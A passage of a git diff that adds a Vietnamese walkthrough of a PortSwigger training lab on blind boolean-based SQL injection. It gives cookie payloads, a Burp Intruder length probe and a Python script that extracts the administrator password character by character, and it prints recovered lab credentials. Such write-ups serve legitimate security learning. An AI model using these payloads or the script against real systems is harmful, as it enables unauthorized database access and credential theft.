@@ -267,3 +267,82 @@ Vậy có payload `' UNION SELECT NULL, username || ':' || password FROM users--
 ![image](images/lab-10/lab-10-2.png)
 
 Chúng ta sẽ đăng nhập thành công với `administrator:mq2r88abp2y5z7y6xty0`.
+
+## Lab 11: [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+>
+> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+>
+> To solve the lab, log in as the administrator user.
+>
+> **Hint**
+>
+> You can assume that the password only contains lowercase, alphanumeric characters.
+
+Theo như mô tả của bài lab, ứng dụng thực hiện câu truy vấn có chứa giá trị của cookie. Nhưng kết quả của câu truy vấn đó lại không được trả về và chúng ta cũng không thấy được bất kì thông báo lỗi nào.
+
+Tuy nhiên, ứng dụng lại hiển thị một dòng chữ `Welcome back!` khi câu truy vấn trả về hàng nào đó.
+
+![image](images/lab-11/lab-11.png)
+
+Chúng ta thử đổi giá trị của cookie `TrackingId` thành `' OR 1=1--` thì dòng chữ đó vẫn xuất hiện:
+
+![image](images/lab-11/lab-11-1.png)
+
+Nếu tiếp tục thử với payload `' OR 1=2--` thì không còn dòng chữ đó nữa:
+
+![image](images/lab-11/lab-11-2.png)
+
+Như vậy, chúng ta có thể khai thác Boolean-based SQLi, dựa vào sự xuất hiện của dòng chữ `Welcome back!` để kiểm tra xem điều kiện chúng ta thêm vào câu truy vấn là đúng hay sai.
+
+Trước tiên, để tìm được độ dài của password, chúng ta sẽ sử dụng Burp Intruder.
+
+Thực hiện đổi giá trị của cookie `TrackingId` thành payload sau:
+
+```sql
+' OR (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='administrator
+```
+
+Trong payload trên, chúng ta sử dụng subquery để lấy ra `username` từ bảng `users` với điều kiện `username` phải là `administrator` và độ dài của `password` là một số nào đó chúng ta cần brute-force.
+
+Trong trường hợp dòng chữ `Welcome back!` được trả về tức là điều kiện `LENGTH(password)=§1§` đã đúng.
+
+![image](images/lab-11/lab-11-3.png)
+
+Sau khi chạy Burp Intruder, chúng ta xác định được độ dài của password là 20:
+
+![image](images/lab-11/lab-11-4.png)
+
+Với độ dài đã biết của password, chúng ta sẽ so sánh lần lượt từng ký tự trong password của `administrator`.
+
+Ví dụ payload dưới sẽ so sánh ký tự thứ 2 trong password với ký tự `a`, nếu đúng sẽ có dòng chữ `Welcome back!` trong response.
+
+```sql
+' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'), 2, 1)='a
+```
+
+Để khai thác nhanh chóng, chúng ta có thể viết một script Python như sau:
+
+```python
+import requests
+import string
+
+url = "https://0add0018045a73ad8068941d00c80074.web-security-academy.net/"
+charset = string.ascii_lowercase + string.digits
+password = ""
+
+for i in range(1, 21):
+    for j in charset:
+        cookie = {"TrackingId":f"' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{j}"}
+        
+        r = requests.get(url, cookies=cookie)
+        if "Welcome back!" in r.text:
+            password += j
+            break
+
+print(f"administrator:{password}") # administrator:yeuo9hasc1hmsq2rxltz
+
+```
